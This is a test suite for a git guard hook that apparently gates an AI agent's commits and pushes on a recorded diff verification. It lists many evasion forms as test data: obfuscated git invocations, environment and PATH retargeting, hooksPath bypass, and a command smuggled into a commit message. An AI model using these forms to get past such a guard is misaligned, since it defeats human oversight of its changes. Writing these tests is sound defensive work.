import { afterAll, beforeAll, describe, it, expect } from "bun:test";
// The guard ships as runnable Node ESM (it runs on machines without Bun). bun:test imports it
// directly; main() is guarded by an argv check so importing does not execute it.
import {
  captureVerificationGitState,
  isIsolatedTerminalGitCommand,
  isTerminalGitCommand,
  guardEnabled,
  guardEnabledForInvocation,
  evaluateGuard,
  guardDecision,
  isGuardVerificationState,
  commandRequestsHookBypass,
  commitUsesWholeIndex,
  commitHookSurfaceClear,
  guardHooksProjectManaged,
  pushHookSurfaceClear,
  pushSourceMatchesHead,
  resolveGitCwd,
  verifyRecordCommand,
  shellQuote,
  GLOBAL_VERIFY_COMMAND,
} from "../hooks/semctx-guard.mjs";
import { execFileSync, spawnSync } from "node:child_process";
import { copyFileSync, existsSync, lstatSync, readFileSync, realpathSync, chmodSync, mkdirSync, mkdtempSync, renameSync, rmdirSync, rmSync, symlinkSync, unlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { pathToFileURL } from "node:url";
import {
  captureRecordableVerificationGitState,
  captureVerificationGitState as captureApplicationVerificationGitState,
} from "@semantic-context/app-services";

// A host-compatible POSIX shell is required only for shellQuote round-trip and command-replay e2e.
// Default Git-for-Windows puts Git\cmd on PATH (git.exe) but not Git\bin (bash.exe). Windows may
// also expose WSL's bash.exe, which cannot consume host paths or find the host Bun binary.
const hostPathProbe = process.platform === "win32" ? String.raw`C:\semctx probe\a$b` : "/tmp/semctx probe/a$b";
const quotedHostPathProbe = `'${hostPathProbe.replaceAll("'", "'\\''")}'`;
const hasHostCompatibleBash = (() => {
  try {
    const echoed = execFileSync("bash", ["-c", `printf '%s' ${quotedHostPathProbe}`], {
      encoding: "utf8",
    });
    return echoed === hostPathProbe;
  } catch {
    return false;
  }
})();
const bashCanRunBun =
  hasHostCompatibleBash &&
  (() => {
    try {
      execFileSync("bash", ["-c", "command -v bun >/dev/null"], { stdio: "ignore" });
      return true;
    } catch {
      return false;
    }
  })();

const GUARD_SCRIPT = join(import.meta.dir, "..", "hooks", "semctx-guard.mjs");
const PLUGIN_VERSION: string = JSON.parse(readFileSync(join(import.meta.dir, "..", ".claude-plugin", "plugin.json"), "utf8")).version;

async function isolatedRecoveryFixture() {
  const root = mkdtempSync(join(tmpdir(), "semctx-guard-recovery-"));
  mkdirSync(join(root, "hooks"));
  mkdirSync(join(root, "dist"));
  mkdirSync(join(root, ".claude-plugin"));
  const hook = join(root, "hooks", "guard.mjs");
  copyFileSync(GUARD_SCRIPT, hook);
  writeFileSync(join(root, ".claude-plugin", "plugin.json"), JSON.stringify({ version: PLUGIN_VERSION }));
  const guard = await import(pathToFileURL(hook).href);
  return { root, guard, env: { ...process.env, PATH: dirname(process.execPath) } };
}

function createRecoveryRepository(root: string) {
  mkdirSync(root);
  execFileSync("git", ["init", "-b", "main"], { cwd: root, stdio: "ignore" });
  writeFileSync(join(root, "tracked.ts"), "export const answer = 42;\n");
  writeFileSync(join(root, ".gitignore"), ".semctx/\n");
  execFileSync("git", ["add", "."], { cwd: root, stdio: "ignore" });
  execFileSync("git", ["-c", "user.name=Semctx Test", "-c", "user.email=semctx@example.invalid", "commit", "-m", "fixture"], { cwd: root, stdio: "ignore" });
  mkdirSync(join(root, ".semctx"));
  writeFileSync(join(root, ".semctx", "guard.json"), '{"enabled":true}');
}

function runGuardProcess(
  cwd: string,
  stdin: string,
  env: Record<string, string | undefined> = {},
): { code: number; stderr: string } {
  const child = spawnSync("node", [GUARD_SCRIPT], {
    cwd,
    input: stdin,
    encoding: "utf8",
    env: { ...process.env, ...env },
  });
  return { code: child.status ?? 1, stderr: child.stderr };
}

describe("guard process input boundary", () => {
  it("refuses empty, invalid, and truncated stdin when blocking is forced", () => {
    for (const input of ["", "not json", '{"tool_name":"Bash"', "null", "[]", "1"]) {
      const result = runGuardProcess(process.cwd(), input, { SEMCTX_GUARD: "on" });
      expect(result.code).toBe(2);
      expect(result.stderr).toContain("semctx guarded mode: invalid hook input");
    }
  });

  it("keeps invalid stdin advisory when blocking is not established", () => {
    const root = mkdtempSync(join(tmpdir(), "semctx-guard-input-advisory-"));
    try {
      expect(runGuardProcess(root, "not json", { SEMCTX_GUARD: undefined })).toEqual({ code: 0, stderr: "" });
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });

  it("uses only the exact process cwd guard declaration for invalid stdin", () => {
    const root = mkdtempSync(join(tmpdir(), "semctx-guard-input-root-"));
    const nested = join(root, "nested");
    mkdirSync(join(root, ".semctx"), { recursive: true });
    mkdirSync(nested);
    writeFileSync(join(root, ".semctx", "guard.json"), JSON.stringify({ enabled: true }));
    try {
      expect(runGuardProcess(root, "", { SEMCTX_GUARD: undefined }).code).toBe(2);
      expect(runGuardProcess(nested, "", { SEMCTX_GUARD: undefined })).toEqual({ code: 0, stderr: "" });
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });
});

describe("isTerminalGitCommand — structural detection (no shell eval)", () => {
  it("detects commit and push, including global options and env assignments", () => {
    expect(isTerminalGitCommand("git commit -m 'x'")).toBe("commit");
    expect(isTerminalGitCommand("git push origin main")).toBe("push");
    expect(isTerminalGitCommand("git -C sub commit -m x")).toBe("commit");
    expect(isTerminalGitCommand("git -c user.name=x commit")).toBe("commit");
    expect(isTerminalGitCommand("git --git-dir ../other/.git --work-tree ../other commit -m x")).toBe("commit");
    expect(isTerminalGitCommand("cd repo && git commit -m x")).toBe("commit");
    expect(isTerminalGitCommand("GIT_AUTHOR_NAME=x git commit")).toBe("commit");
    expect(isTerminalGitCommand("env GIT_DIR=../other/.git git commit -m x")).toBe("commit");
    expect(isTerminalGitCommand("env -i GIT_AUTHOR_NAME=x git commit -m x")).toBe("commit");
    expect(isTerminalGitCommand("env -u GIT_DIR git push origin main")).toBe("push");
    expect(isTerminalGitCommand("env -S 'git commit -m x'")).toBe("commit");
    expect(isTerminalGitCommand("git add -A && git commit -m x")).toBe("commit");
    expect(isTerminalGitCommand('PATH="../proxy bin" git commit -m x')).toBe("commit");
    expect(isTerminalGitCommand('HOME="../alternate; home" git push origin main')).toBe("push");
    expect(isTerminalGitCommand(String.raw`PATH=../proxy\ bin git commit -m x`)).toBe("commit");
    expect(isTerminalGitCommand(String.raw`g\it commit -m x`)).toBe("commit");
    expect(isTerminalGitCommand("gi't' push origin main")).toBe("push");
    expect(isTerminalGitCommand("g\\\nit commit -m x")).toBe("commit");
    expect(isTerminalGitCommand('P\'A\'TH="../proxy bin" git commit -m x')).toBe("commit");
    expect(isTerminalGitCommand('PATH="../proxy bin" bash -c \'git push origin main\'')).toBe("push");
    expect(isTerminalGitCommand('PATH="../proxy bin" command bash -c \'git commit -m x\'')).toBe("commit");
    expect(isTerminalGitCommand("git co'mmit' -m x")).toBe("commit");
    expect(isTerminalGitCommand(String.raw`git pu\sh origin main`)).toBe("push");
    expect(isTerminalGitCommand("co'mmand' git commit -m x")).toBe("commit");
    expect(isTerminalGitCommand(String.raw`e\xec git push origin main`)).toBe("push");
    expect(isTerminalGitCommand("command -- git commit -m x")).toBe("commit");
    expect(isTerminalGitCommand("command -p git push origin main")).toBe("push");
    expect(isTerminalGitCommand("exec git commit -m x")).toBe("commit");
    expect(isTerminalGitCommand("exec -a semctx-git git push origin main")).toBe("push");
    expect(isTerminalGitCommand("builtin command git commit -m x")).toBe("commit");
    expect(isTerminalGitCommand("$(true; printf git) commit -m x")).toBe("commit");
    expect(isTerminalGitCommand("`true; printf git` push origin main")).toBe("push");
    expect(isTerminalGitCommand("$GIT commit -m x")).toBe("commit");
    expect(isTerminalGitCommand("${GIT} push origin main")).toBe("push");
    expect(isTerminalGitCommand("${GIT:-git} commit -m x")).toBe("commit");
    expect(isTerminalGitCommand("$(printf git) commit -m x")).toBe("commit");
    expect(isTerminalGitCommand("`printf git` push origin main")).toBe("push");
    expect(isTerminalGitCommand("git${IFS}push . --all")).toBe("push");
    expect(isTerminalGitCommand("g${EMPTY}it${IFS}commit -m x")).toBe("commit");
    expect(isTerminalGitCommand("command${IFS}git${IFS}push . --all")).toBe("push");
    expect(isTerminalGitCommand("${GIT:-git}${IFS}push origin HEAD")).toBe("push");
    expect(isTerminalGitCommand("$GIT${IFS}commit -m x")).toBe("commit");
    expect(isTerminalGitCommand("$(printf git)${IFS}commit -m x")).toBe("commit");
    expect(isTerminalGitCommand("`printf git`${IFS}push origin HEAD")).toBe("push");
    expect(isTerminalGitCommand("${X:=git}${IFS}push origin HEAD")).toBe("push");
    expect(isTerminalGitCommand("${X=git}${IFS}commit -m x")).toBe("commit");
    expect(isTerminalGitCommand("${X-git}${IFS}push origin HEAD")).toBe("push");
    expect(isTerminalGitCommand("${X:+git}${IFS}commit -m x")).toBe("commit");
    expect(isTerminalGitCommand("${X:-g}it${IFS}push origin HEAD")).toBe("push");
    expect(isTerminalGitCommand("git${IFS}${V:-pu}sh origin HEAD")).toBe("push");
    expect(isTerminalGitCommand("$(printf g)it${IFS}push origin HEAD")).toBe("push");
    expect(isTerminalGitCommand("`printf gi`t${IFS}commit -m x")).toBe("commit");
    expect(isTerminalGitCommand("echo $(git push origin HEAD)")).toBe("push");
    expect(isTerminalGitCommand("`git push origin HEAD`")).toBe("push");
    expect(isTerminalGitCommand("x=$(git push origin HEAD)")).toBe("push");
    expect(isTerminalGitCommand("true & git push origin HEAD")).toBe("push");
    expect(isTerminalGitCommand("git status & git push . HEAD")).toBe("push");
    expect(isTerminalGitCommand("(git push origin HEAD)")).toBe("push");
    expect(isTerminalGitCommand("{ git push origin HEAD; }")).toBe("push");
    expect(isTerminalGitCommand("echo $(git commit -m x)")).toBe("commit");
    expect(isTerminalGitCommand("true & git commit -m x")).toBe("commit");
    expect(isTerminalGitCommand("(git commit -m x)")).toBe("commit");
    expect(isTerminalGitCommand("if true; then git push origin HEAD; fi")).toBe("push");
    expect(isTerminalGitCommand("for f in a; do git push origin HEAD; done")).toBe("push");
    expect(isTerminalGitCommand("while true; do git commit -m x; done")).toBe("commit");
    expect(isTerminalGitCommand("nohup git push origin HEAD")).toBe("push");
    expect(isTerminalGitCommand("time git push origin HEAD")).toBe("push");
    expect(isTerminalGitCommand("timeout 60 git push origin HEAD")).toBe("push");
    expect(isTerminalGitCommand("sudo -u root git push origin HEAD")).toBe("push");
    expect(isTerminalGitCommand("nice -n 5 git commit -m x")).toBe("commit");
    expect(isTerminalGitCommand("setsid git push origin HEAD")).toBe("push");
    expect(isTerminalGitCommand("stdbuf -o0 git push origin HEAD")).toBe("push");
  });

  it("detects common wrapper, quoted, absolute-path, and shell -c shapes", () => {
    expect(isTerminalGitCommand("/usr/bin/git commit -m x")).toBe("commit");
    expect(isTerminalGitCommand('"git" push origin main')).toBe("push");
    expect(isTerminalGitCommand("command git commit -m x")).toBe("commit");
    expect(isTerminalGitCommand("bash -c 'git push origin main'")).toBe("push");
    expect(isTerminalGitCommand('powershell -Command "git commit -am x"')).toBe("commit");
    expect(isTerminalGitCommand('pwsh -Command "git push origin main"')).toBe("push");
    expect(isTerminalGitCommand('cmd /c "git commit -am x"')).toBe("commit");
    expect(isTerminalGitCommand('env bash -c "git push origin main"')).toBe("push");
    expect(isTerminalGitCommand('env -i bash --noprofile -c "git commit -am x"')).toBe("commit");
    expect(isTerminalGitCommand("bash -lc 'git push origin HEAD'")).toBe("push");
    expect(isTerminalGitCommand("sh -ec 'git commit -m x'")).toBe("commit");
    expect(isTerminalGitCommand("sh -xc 'git push origin HEAD'")).toBe("push");
    expect(isTerminalGitCommand("bash -euc 'git commit -m x'")).toBe("commit");
    expect(isTerminalGitCommand("zsh -lc 'git push origin HEAD'")).toBe("push");
    expect(isTerminalGitCommand('pwsh -NoProfile -ExecutionPolicy Bypass -Command "git push origin main"')).toBe("push");
    expect(isTerminalGitCommand("eval 'git push origin HEAD'")).toBe("push");
    expect(isTerminalGitCommand("eval 'git commit -m x'")).toBe("commit");
    expect(isTerminalGitCommand("xargs sh -c 'git push origin HEAD'")).toBe("push");
    expect(isTerminalGitCommand("xargs -0 bash -c 'git commit -m x'")).toBe("commit");
  });

  it("does not fire on non-terminal or look-alike commands", () => {
    expect(isTerminalGitCommand("git status")).toBeNull();
    expect(isTerminalGitCommand("git log --grep=commit")).toBeNull();
    expect(isTerminalGitCommand("echo '$(git push origin HEAD)'")).toBeNull();
    expect(isTerminalGitCommand("printf '%s' '(git push origin HEAD)'")).toBeNull();
    expect(isTerminalGitCommand("git add -A")).toBeNull();
    expect(isTerminalGitCommand("echo git commit")).toBeNull();
    expect(isTerminalGitCommand("gitfoo commit")).toBeNull();
    expect(isTerminalGitCommand("npm run commit")).toBeNull();
    expect(isTerminalGitCommand("echo${IFS}git${IFS}push")).toBeNull();
    expect(isTerminalGitCommand("git${EMPTY}pusher . --all")).toBeNull();
    expect(isTerminalGitCommand("${ECHO}${IFS}push")).toBeNull();
    expect(isTerminalGitCommand("${X:=echo}${IFS}push")).toBeNull();
    expect(isTerminalGitCommand("${X:=gitlab}${IFS}push")).toBeNull();
    expect(isTerminalGitCommand("${X:-e}cho${IFS}git${IFS}push")).toBeNull();
    expect(isTerminalGitCommand("$(printf e)cho${IFS}git${IFS}push")).toBeNull();
    expect(isTerminalGitCommand("")).toBeNull();
  });
});

describe("isIsolatedTerminalGitCommand — no mutation before authorization", () => {
  it("allows one terminal Git operation with safe cwd, env, command, and Git prefixes", () => {
    expect(isIsolatedTerminalGitCommand("git commit -m x")).toBe(true);
    expect(isIsolatedTerminalGitCommand("git commit -m '$MESSAGE'")).toBe(true);
    expect(isIsolatedTerminalGitCommand("cd repo && git push origin main")).toBe(true);
    expect(isIsolatedTerminalGitCommand("env GIT_AUTHOR_NAME=x git commit -m x")).toBe(true);
    expect(isIsolatedTerminalGitCommand("env -u SEMCTX_UNUSED git push origin main")).toBe(true);
  });

  it("rejects compound mutation, forced ignored staging, and shell substitutions", () => {
    expect(isIsolatedTerminalGitCommand("powershell -Command Set-Content tracked.ts bad && git commit -am x")).toBe(false);
    expect(isIsolatedTerminalGitCommand("git add -f ignored.txt && git commit -m x")).toBe(false);
    expect(isIsolatedTerminalGitCommand("git commit -m \"$(touch mutated.ts)\"")).toBe(false);
    expect(isIsolatedTerminalGitCommand("git commit -m x > commit.log")).toBe(false);
    expect(isIsolatedTerminalGitCommand('powershell -Command "git commit -am x"')).toBe(false);
    expect(isIsolatedTerminalGitCommand('pwsh -Command "git push origin main"')).toBe(false);
    expect(isIsolatedTerminalGitCommand('cmd /c "git commit -am x"')).toBe(false);
    expect(isIsolatedTerminalGitCommand('env bash -c "git commit -am x"')).toBe(false);
    expect(isIsolatedTerminalGitCommand('env -i bash --noprofile -c "git commit -am x"')).toBe(false);
    expect(isIsolatedTerminalGitCommand("bash -lc 'git push origin HEAD'")).toBe(false);
    expect(isIsolatedTerminalGitCommand("sh -euc 'git commit -m x'")).toBe(false);
    expect(isIsolatedTerminalGitCommand('pwsh -NoProfile -ExecutionPolicy Bypass -Command "git push origin main"')).toBe(false);
    expect(isIsolatedTerminalGitCommand("co'mmand' git commit -m x")).toBe(false);
    expect(isIsolatedTerminalGitCommand(String.raw`e\xec git push origin main`)).toBe(false);
    expect(isIsolatedTerminalGitCommand("command -p git push origin main")).toBe(false);
    expect(isIsolatedTerminalGitCommand("command git commit -m x")).toBe(false);
    expect(isIsolatedTerminalGitCommand("exec git commit -m x")).toBe(false);
    expect(isIsolatedTerminalGitCommand("builtin command git commit -m x")).toBe(false);
    expect(isIsolatedTerminalGitCommand("$GIT commit -m x")).toBe(false);
    expect(isIsolatedTerminalGitCommand("${GIT} push origin main")).toBe(false);
    expect(isIsolatedTerminalGitCommand("${GIT:-git} commit -m x")).toBe(false);
    expect(isIsolatedTerminalGitCommand("$(printf git) commit -m x")).toBe(false);
    expect(isIsolatedTerminalGitCommand("`printf git` push origin main")).toBe(false);
    expect(isIsolatedTerminalGitCommand("git push .${IFS}--all")).toBe(false);
    expect(isIsolatedTerminalGitCommand('git commit -m "$MESSAGE"')).toBe(false);
    expect(isIsolatedTerminalGitCommand('git push ".\'${IFS}--all"')).toBe(false);
    expect(isIsolatedTerminalGitCommand("eval 'git push origin HEAD'")).toBe(false);
    expect(isIsolatedTerminalGitCommand("xargs sh -c 'git commit -m x'")).toBe(false);
  });

  it("rejects cwd targets that require shell expansion", () => {
    for (const command of [
      "cd $SEMCTX_TARGET && git commit -m x",
      "cd ${SEMCTX_TARGET} && git push origin main",
      "cd ~ && git commit -m x",
      "git -C $SEMCTX_TARGET commit -m x",
      "git -C ${SEMCTX_TARGET} push origin main",
      "git -C ~ commit -m x",
      "git -C$SEMCTX_TARGET commit -m x",
    ]) {
      expect(isIsolatedTerminalGitCommand(command)).toBe(false);
    }
  });

  it("rejects environment, option, and config forms that retarget Git state", () => {
    for (const command of [
      "PATH=../proxy-bin git commit -m x",
      "PATHEXT=.PROXY git push origin main",
      "HOME=../alternate-home git commit -m x",
      "XDG_CONFIG_HOME=../alternate-config git push origin main",
      "USERPROFILE=..\\alternate-profile git commit -m x",
      "HOMEDRIVE=Z: git push origin main",
      "HOMEPATH=\\alternate-home git commit -m x",
      "GIT_EXEC_PATH=../proxy-libexec git commit -m x",
      "GIT_CEILING_DIRECTORIES=.. git commit -m x",
      "GIT_DISCOVERY_ACROSS_FILESYSTEM=true git push origin main",
      "GIT_DIR=../other/.git git commit -m x",
      "GIT_WORK_TREE=../other git commit -m x",
      "GIT_COMMON_DIR=../other/.git git push origin main",
      "GIT_INDEX_FILE=../other/index git commit -m x",
      "GIT_CONFIG_COUNT=1 git commit -m x",
      "env GIT_DIR=../other/.git GIT_WORK_TREE=../other git commit -m x",
      "env PATH=../proxy-bin git commit -m x",
      'PATH="../proxy bin" git commit -m x',
      'HOME="../alternate home" git push origin main',
      'XDG_CONFIG_HOME="../alternate; config" git commit -m x',
      String.raw`PATH=../proxy\ bin git commit -m x`,
      'P\'A\'TH="../proxy bin" git commit -m x',
      'PATH="../proxy bin" bash -c \'git push origin main\'',
      'PATH="../proxy bin" command bash -c \'git commit -m x\'',
      "env HOME=../alternate-home git push origin main",
      "env XDG_CONFIG_HOME=../alternate-config git commit -m x",
      "env -i GIT_COMMON_DIR=../other/.git git push origin main",
      "env -i GIT_AUTHOR_NAME=x git commit -m x",
      "env -u GIT_DIR git commit -m x",
      "env -u PATH git commit -m x",
      "env --unset=HOME git push origin main",
      "env -C ../other git commit -m x",
      "env -S 'git commit -m x'",
      "git --git-dir ../other/.git --work-tree ../other commit -m x",
      "git --git-dir=../other/.git --work-tree=../other commit -m x",
      "git --exec-path=../proxy-libexec commit -m x",
      "git --namespace other push origin main",
      "git --bare commit -m x",
      "git -c core.worktree=../other commit -m x",
      "git -c core.bare=true commit -m x",
      "git -c core.hooksPath=.semctx/no-hooks commit -m x",
      "git -c include.path=.semctx/indirect.gitconfig commit -m x",
      "git -ccore.hooksPath=.semctx/no-hooks commit -m x",
      "git --config-env=include.path=SEMCTX_GIT_CONFIG commit -m x",
    ]) {
      expect(isIsolatedTerminalGitCommand(command)).toBe(false);
    }
  });

  it("detects explicit Git paths but refuses to authorize a substituted executable", () => {
    for (const command of [
      "/tmp/proxy/git commit -m x",
      "./proxy/git push origin main",
      "C:\\proxy\\git.exe commit -m x",
      "C:\\proxy\\git.cmd push origin main",
      "git.bat commit -m x",
      "git.com push origin main",
      '"/tmp/proxy bin/git" commit -m x',
      String.raw`/tmp/proxy\ bin/git push origin main`,
      String.raw`g\it commit -m x`,
      "gi't' push origin main",
      "g\\\nit commit -m x",
    ]) {
      expect(isTerminalGitCommand(command)).not.toBeNull();
      expect(isIsolatedTerminalGitCommand(command)).toBe(false);
    }
  });
});

describe("commitUsesWholeIndex — no commit-time tree selection", () => {
  it("allows plain commits that consume the already inspected index", () => {
    expect(commitUsesWholeIndex("git commit -m exact")).toBe(true);
    expect(commitUsesWholeIndex('git commit -m "it\'s exact"')).toBe(true);
    expect(commitUsesWholeIndex(`git commit -m 'the "exact" state'`)).toBe(true);
    expect(commitUsesWholeIndex("git commit --amend --no-edit")).toBe(true);
    expect(commitUsesWholeIndex("git -C repo commit --message=exact")).toBe(true);
  });

  it("rejects restaging, interactive, partial-index, and pathspec forms", () => {
    for (const command of [
      "git commit -am partial", "git commit -a -m partial", "git commit --all -m partial",
      "git commit -i a.ts -m partial", "git commit --include a.ts -m partial",
      "git commit -o a.ts -m partial", "git commit --only a.ts -m partial",
      "git commit -p", "git commit --patch", "git commit --interactive",
      "git commit -m partial -- a.ts", "git commit a.ts -m partial",
      "git commit --pathspec-from-file=paths.txt", "git commit --pathspec-file-nul",
      "git commit --fixup=HEAD", "git commit --fixup amend:HEAD", "git commit --fixup=amend:HEAD",
      "git commit --fixup=reword:HEAD", "git commit --fixup reword:HEAD",
      "git commit --inter", "git commit --incl a.ts -m partial", "git commit --on a.ts -m partial",
      "git commit --fix=reword:HEAD", "git co'mmit' -m x",
    ]) expect(commitUsesWholeIndex(command), command).toBe(false);
  });
});

describe("guardEnabled — advisory by default, strict off wins", () => {
  it("defaults to advisory (false) with no env and no guard.json", () => {
    expect(guardEnabled({}, null)).toBe(false);
    expect(guardEnabled({}, { enabled: false })).toBe(false);
  });
  it("is guarded when .semctx/guard.json enables it", () => {
    expect(guardEnabled({}, { enabled: true })).toBe(true);
  });
  it("SEMCTX_GUARD=off strictly disables even if guard.json enables", () => {
    expect(guardEnabled({ SEMCTX_GUARD: "off" }, { enabled: true })).toBe(false);
  });
  it("SEMCTX_GUARD=on forces guarded", () => {
    expect(guardEnabled({ SEMCTX_GUARD: "on" }, null)).toBe(true);
  });

  it("distinguishes absent guard config from unreadable or malformed config", () => {
    const repo = mkdtempSync(join(tmpdir(), "semctx-guard-enablement-"));
    execFileSync("git", ["init"], { cwd: repo, stdio: "ignore" });
    const guardDir = join(repo, ".semctx");
    const guardPath = join(guardDir, "guard.json");
    mkdirSync(guardDir);
    const input = { command: "git commit -m x", cwd: repo, sessionCwd: repo, env: {} };
    try {
      expect(guardEnabledForInvocation(input)).toBe(false);

      writeFileSync(guardPath, "{not-json");
      expect(guardEnabledForInvocation(input)).toBeUndefined();
      expect(evaluateGuard(input)).toEqual({ block: false });
      expect(guardEnabledForInvocation({ ...input, env: { SEMCTX_GUARD: "off" } })).toBe(false);
      expect(guardEnabledForInvocation({ ...input, env: { SEMCTX_GUARD: "on" } })).toBe(true);

      writeFileSync(guardPath, JSON.stringify({ enabled: "sometimes" }));
      expect(guardEnabledForInvocation(input)).toBeUndefined();

      rmSync(guardPath);
      mkdirSync(guardPath);
      expect(guardEnabledForInvocation(input)).toBeUndefined();

      rmSync(guardPath, { recursive: true });
      symlinkSync(
        join(repo, "missing-guard-target"),
        guardPath,
        process.platform === "win32" ? "junction" : "file",
      );
      expect(guardEnabledForInvocation(input)).toBeUndefined();

      rmSync(guardPath, { force: true });
      rmdirSync(guardDir);
      symlinkSync(
        join(repo, "missing-semctx-target"),
        guardDir,
        process.platform === "win32" ? "junction" : "dir",
      );
      expect(guardEnabledForInvocation(input)).toBeUndefined();

      rmSync(guardDir, { force: true });
      mkdirSync(guardDir);
      writeFileSync(guardPath, JSON.stringify({ enabled: false }));
      expect(guardEnabledForInvocation(input)).toBe(false);
    } finally {
      rmSync(repo, { recursive: true, force: true });
    }
  });
});

describe("guardDecision — diff-hash gate (ADR 0007)", () => {
  const HASH = `sha256:${"1".repeat(64)}`;
  const CONTENT = `sha256:${"2".repeat(64)}`;
  const REPOSITORY = `sha256:${"3".repeat(64)}`;
  const RECORDED_AT = "2026-08-31T00:00:00.000Z";
  const CURRENT = {
    headCommit: "a".repeat(40),
    analyzedSourceHash: `sha256:${"4".repeat(64)}`,
    workingStateHash: HASH,
    contentStateHash: CONTENT,
    repositoryStateHash: REPOSITORY,
    indexStateHash: REPOSITORY,
    headTreeHash: REPOSITORY,
  };
  const STATE = { version: 3, ...CURRENT, verdict: "WARN", recordedAt: RECORDED_AT };
  it("advisory profile never blocks", () => {
    expect(guardDecision({ enabled: false, terminalVerb: "commit", state: null, currentState: CURRENT }).block).toBe(false);
  });
  it("non-terminal commands are never blocked", () => {
    expect(guardDecision({ enabled: true, terminalVerb: null, state: null, currentState: CURRENT }).block).toBe(false);
  });
  it("blocks a commit when no verification is on record", () => {
    const d = guardDecision({ enabled: true, terminalVerb: "commit", state: null, currentState: CURRENT });
    expect(d.block).toBe(true);
    expect(d.reason).toContain("verify diff --record");
  });

  it("refuses an unknown root before probing a verifier", () => {
    expect(verifyRecordCommand({ PATH: process.env.PATH })).toContain("repository root is unknown");
  });

  it("rejects legacy declared bundles and falls back to its qualified own bundle", async () => {
    const { root: parent, guard, env } = await isolatedRecoveryFixture();
    try {
      const legacy = join(parent, "legacy");
      mkdirSync(join(legacy, "dist"), { recursive: true });
      mkdirSync(join(legacy, ".claude-plugin"));
      writeFileSync(join(legacy, ".claude-plugin", "plugin.json"), '{"version":"0.2.0"}');
      writeFileSync(join(legacy, "dist", "semctx.js"), 'process.stdout.write("0.2.0");');
      writeFileSync(join(parent, "dist", "semctx.js"), `process.stdout.write(${JSON.stringify(PLUGIN_VERSION)});`);
      const command = guard.verifyRecordCommand({ ...env, CLAUDE_PLUGIN_ROOT: legacy }, undefined, parent);
      expect(command).not.toContain(join(legacy, "dist", "semctx.js"));
      expect(command).toContain(shellQuote(join(parent, "dist", "semctx.js")));
      expect(command).toContain("verify diff --record");
      expect(command).toContain(`cd ${shellQuote(parent)} &&`);
    } finally { rmSync(parent, { recursive: true, force: true }); }
  });

  it("refuses cwd-shadow and Bunless unknown globals without recommending an unsafe record", () => {
    const root = mkdtempSync(join(tmpdir(), "semctx-guard-nobun-"));
    try {
      expect(verifyRecordCommand({ PATH: "." }, undefined, root)).toContain("Recovery unavailable");
      expect(verifyRecordCommand({ PATH: "" }, undefined, root)).toContain(`need semctx ${PLUGIN_VERSION}`);
      expect(verifyRecordCommand({ PATH: "" }, undefined, root)).not.toContain("verify diff --record");
    } finally { rmSync(root, { recursive: true, force: true }); }
  });

  it("qualifies real same-version bundles and quote-protects the selected root", () => {
    const parent = mkdtempSync(join(tmpdir(), "semctx-guard-quote-"));
    try {
      const root = join(parent, "it's a$b`root");
      mkdirSync(join(root, "dist"), { recursive: true });
      writeFileSync(join(root, "dist", "semctx.js"), `process.stdout.write(${JSON.stringify(PLUGIN_VERSION)});`);
      const command = verifyRecordCommand({ ...process.env, CLAUDE_PLUGIN_ROOT: root }, undefined, root);
      expect(command).toContain(shellQuote(root));
      expect(command).toContain(shellQuote(join(root, "dist", "semctx.js")));
    } finally { rmSync(parent, { recursive: true, force: true }); }
  });

  it("uses only own metadata and rejects malformed, incompatible, and timed-out bundles", async () => {
    const root = mkdtempSync(join(tmpdir(), "semctx-guard-isolated-"));
    try {
      mkdirSync(join(root, "hooks"));
      mkdirSync(join(root, "dist"));
      mkdirSync(join(root, ".claude-plugin"));
      writeFileSync(join(root, "hooks", "guard.mjs"), readFileSync(resolve(import.meta.dir, "../hooks/semctx-guard.mjs")));
      const isolated = await import(pathToFileURL(join(root, "hooks", "guard.mjs")).href);
      const bunRoot = dirname(process.execPath);
      const env = { PATH: bunRoot, CLAUDE_PLUGIN_ROOT: root };
      expect(isolated.verifyRecordCommand(env, undefined, root)).toContain("metadata is missing or invalid");
      writeFileSync(join(root, ".claude-plugin", "plugin.json"), JSON.stringify({ version: PLUGIN_VERSION }));
      for (const body of [
        'process.stdout.write("0.2.0");',
        'process.stdout.write("semctx 0.4.2");',
        'process.stdout.write("0.4.2.0");',
        'setTimeout(() => process.stdout.write("0.4.2"), 5000);',
      ]) {
        writeFileSync(join(root, "dist", "semctx.js"), body);
        const result = isolated.verifyRecordCommand(env, undefined, root);
        expect(result).toContain("Recovery unavailable");
        expect(result).not.toContain("verify diff --record");
      }
      writeFileSync(join(root, "dist", "semctx.js"), `process.stdout.write(${JSON.stringify(PLUGIN_VERSION)});`);
      expect(isolated.verifyRecordCommand(env, undefined, root)).toContain("verify diff --record");
    } finally { rmSync(root, { recursive: true, force: true }); }
  });

  it("does not probe verifier dependencies for advisory or unrelated calls", () => {
    const root = mkdtempSync(join(tmpdir(), "semctx-guard-no-probe-"));
    try {
      mkdirSync(join(root, "dist"));
      const marker = join(root, "probed");
      writeFileSync(join(root, "dist", "semctx.js"), `require("node:fs").writeFileSync(${JSON.stringify(marker)}, "yes"); process.stdout.write(${JSON.stringify(PLUGIN_VERSION)});`);
      const env = { ...process.env, CLAUDE_PLUGIN_ROOT: root, SEMCTX_GUARD: "off" };
      expect(evaluateGuard({ command: "git commit -m x", cwd: root, env }).block).toBe(false);
      expect(evaluateGuard({ command: "git status", cwd: root, env: { ...env, SEMCTX_GUARD: "on" } }).block).toBe(false);
      expect(existsSync(marker)).toBe(false);
    } finally { rmSync(root, { recursive: true, force: true }); }
  });

  it("does not probe a reachable verifier for an authorized exact commit", async () => {
    const { root, guard, env } = await isolatedRecoveryFixture();
    try {
      const repository = join(root, "repository");
      createRecoveryRepository(repository);
      const marker = join(root, "probed");
      writeFileSync(join(root, "dist", "semctx.js"), `require("node:fs").writeFileSync(${JSON.stringify(marker)}, "yes"); process.stdout.write(${JSON.stringify(PLUGIN_VERSION)});`);
      const runtimeEnv = { ...process.env, ...env, CLAUDE_PLUGIN_ROOT: root, SEMCTX_GUARD: "on" };
      expect(guard.verifyRecordCommand(runtimeEnv, undefined, repository)).toContain("verify diff --record");
      expect(existsSync(marker)).toBe(true);
      unlinkSync(marker);
      writeFileSync(join(repository, ".semctx", "verification-state.json"), JSON.stringify({
        version: 3, ...captureVerificationGitState(repository), verdict: "PASS", recordedAt: "2026-10-07T00:00:00.000Z",
      }));
      expect(guard.evaluateGuard({ command: "git commit -m x", cwd: repository, env: runtimeEnv })).toEqual({ block: false });
